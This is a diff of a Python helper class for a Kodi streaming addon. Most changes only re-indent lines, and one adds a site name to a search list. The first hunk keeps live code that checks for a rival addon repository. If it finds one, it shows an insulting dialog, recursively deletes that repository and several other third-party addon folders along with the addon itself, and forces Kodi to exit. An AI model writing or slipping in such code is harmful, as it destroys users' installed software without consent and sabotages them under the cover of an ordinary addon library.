@@ -51,32 +51,32 @@ class md:
 			self.args = self.parse_query(sys.argv[2][1:])
 
 		fuck_you_anonymous1 = xbmc.translatePath('special://home/addons/plugin.program.anonymouswizard')
-                fuck_you_anonymous2 = xbmc.translatePath('special://home/addons/plugin.program.plugin.program.mafwizard')
-                fuck_you_anonymous3 = xbmc.translatePath('special://home/addons/plugin.video.ass')
-                fuck_you_anonymous4 = xbmc.translatePath('special://home/addons/plugin.video.floki')
-                fuck_you_anonymous5 = xbmc.translatePath('special://home/addons/plugin.video.kratos')
-                fuck_you_anonymous6 = xbmc.translatePath('special://home/addons/plugin.video.wargames')
-                fuck_you_anonymous7 = xbmc.translatePath('special://home/addons/repository.maf')
-                if os.path.exists(fuck_you_anonymous7):
-                        line1 = "you have Installed From An"
-                        line2 = "Unofficial Source And Will Now Delete Please"
-                        line3 = "Install From [COLOR red]http://muckys.mediaportal4kodi.ml[/COLOR]"
-                        line4 = "Removed Repos And Addons"
-                        line5 = "successfully Please Dont Support Idiots"
-                        self.addon.show_ok_dialog([line1, line2, line3], self.addon_name)
-                        delete_addon = self.addon.get_path()
-                        shutil.rmtree(delete_addon, ignore_errors=True)
-                        shutil.rmtree(fuck_you_anonymous1, ignore_errors=True)
-                        shutil.rmtree(fuck_you_anonymous2, ignore_errors=True)
-                        shutil.rmtree(fuck_you_anonymous3, ignore_errors=True)
-                        shutil.rmtree(fuck_you_anonymous4, ignore_errors=True)
-                        shutil.rmtree(fuck_you_anonymous5, ignore_errors=True)
-                        shutil.rmtree(fuck_you_anonymous6, ignore_errors=True)
-                        shutil.rmtree(fuck_you_anonymous7, ignore_errors=True)
-                        self.addon.log('===DELETING===ADDON===+===REPO===')
-                        self.addon.show_ok_dialog([line4, line5], self.addon_name)
-                        time.sleep(2)
-                        os._exit(0)
+		fuck_you_anonymous2 = xbmc.translatePath('special://home/addons/plugin.program.plugin.program.mafwizard')
+		fuck_you_anonymous3 = xbmc.translatePath('special://home/addons/plugin.video.ass')
+		fuck_you_anonymous4 = xbmc.translatePath('special://home/addons/plugin.video.floki')
+		fuck_you_anonymous5 = xbmc.translatePath('special://home/addons/plugin.video.kratos')
+		fuck_you_anonymous6 = xbmc.translatePath('special://home/addons/plugin.video.wargames')
+		fuck_you_anonymous7 = xbmc.translatePath('special://home/addons/repository.maf')
+		if os.path.exists(fuck_you_anonymous7):
+			line1 = "you have Installed From An"
+			line2 = "Unofficial Source And Will Now Delete Please"
+			line3 = "Install From [COLOR red]http://muckys.mediaportal4kodi.ml[/COLOR]"
+			line4 = "Removed Repos And Addons"
+			line5 = "successfully Please Dont Support Idiots"
+			self.addon.show_ok_dialog([line1, line2, line3], self.addon_name)
+			delete_addon = self.addon.get_path()
+			shutil.rmtree(delete_addon, ignore_errors=True)
+			shutil.rmtree(fuck_you_anonymous1, ignore_errors=True)
+			shutil.rmtree(fuck_you_anonymous2, ignore_errors=True)
+			shutil.rmtree(fuck_you_anonymous3, ignore_errors=True)
+			shutil.rmtree(fuck_you_anonymous4, ignore_errors=True)
+			shutil.rmtree(fuck_you_anonymous5, ignore_errors=True)
+			shutil.rmtree(fuck_you_anonymous6, ignore_errors=True)
+			shutil.rmtree(fuck_you_anonymous7, ignore_errors=True)
+			self.addon.log('===DELETING===ADDON===+===REPO===')
+			self.addon.show_ok_dialog([line4, line5], self.addon_name)
+			time.sleep(2)
+			os._exit(0)
 
 
 
@@ -113,10 +113,10 @@ class md:
 
 
 	def regex_get_all(self, text, start_with, end_with, excluding=False):
-                if excluding:
-                        r = re.findall("(?i)" + start_with + "([\S\s]+?)" + end_with, text)
-                else:
-                        r = re.findall("(?i)(" + start_with + "[\S\s]+?" + end_with + ")", text)
+		if excluding:
+			r = re.findall("(?i)" + start_with + "([\S\s]+?)" + end_with, text)
+		else:
+			r = re.findall("(?i)(" + start_with + "[\S\s]+?" + end_with + ")", text)
 		return r
 
 
@@ -131,7 +131,7 @@ class md:
 
 
 	def dialog_yesno(self,message,yes,no):
-                return dialog.yesno(self.addon_name, message, yeslabel=yes, nolabel=no)
+		return dialog.yesno(self.addon_name, message, yeslabel=yes, nolabel=no)
 
 
 
@@ -183,8 +183,8 @@ class md:
 
 
 	def Exit(self):
-                xbmc.executebuiltin("XBMC.Container.Update(path,replace)")
-                xbmc.executebuiltin("XBMC.ActivateWindow(Home)")
+		xbmc.executebuiltin("XBMC.Container.Update(path,replace)")
+		xbmc.executebuiltin("XBMC.ActivateWindow(Home)")
 
 
 
@@ -214,16 +214,16 @@ class md:
 			infolabels = {}
 
 		if content == 'movies':
-			match = ['123movies','m4u','pubfilm','yesmovies','niter','movievault','hdbox','afdah','watch32hd']
+			match = ['123movies','m4u','pubfilm','cmovieshd','yesmovies','niter','movievault','hdbox','afdah','watch32hd']
 		else:
-			match = ['123movies','m4u','pubfilm','yesmovies','ws','luckytv']
+			match = ['123movies','m4u','pubfilm','cmovieshd','yesmovies','ws','luckytv']
 
 		
 		for addon_title in match:
 
-                        name = addon_title
-                        if name == 'ws':
-                                name = 'watchseries'
+			name = addon_title
+			if name == 'ws':
+				name = 'watchseries'
 
 			if addon_title not in self.addon_id:
 				title = '[COLOR white][COLOR red]Search[/COLOR] %s [COLOR red]For[/COLOR] %s[/COLOR]' %(name,query)
@@ -267,7 +267,7 @@ class md:
 
 
 	def remove_punctuation(self, text):
-                return str(text).translate(None, string.punctuation)
+		return str(text).translate(None, string.punctuation)
 
 
 
@@ -361,7 +361,7 @@ class md:
 
 				for a in data:
 
-                                        b = ast.literal_eval(a)
+					b = ast.literal_eval(a)
 
 					if 'url' in b:
 						url = b['url']
@@ -689,9 +689,9 @@ class md:
 			meta['backdrop_url'] = fan_art['fanart']
 
 		if meta['backdrop_url'] == 'http://thetvdb.com/banners/fanart/original/76703-10.jpg':
-                        meta['backdrop_url'] = fan_art['fanart']
+			meta['backdrop_url'] = fan_art['fanart']
 
-                return meta
+		return meta
 
 
 
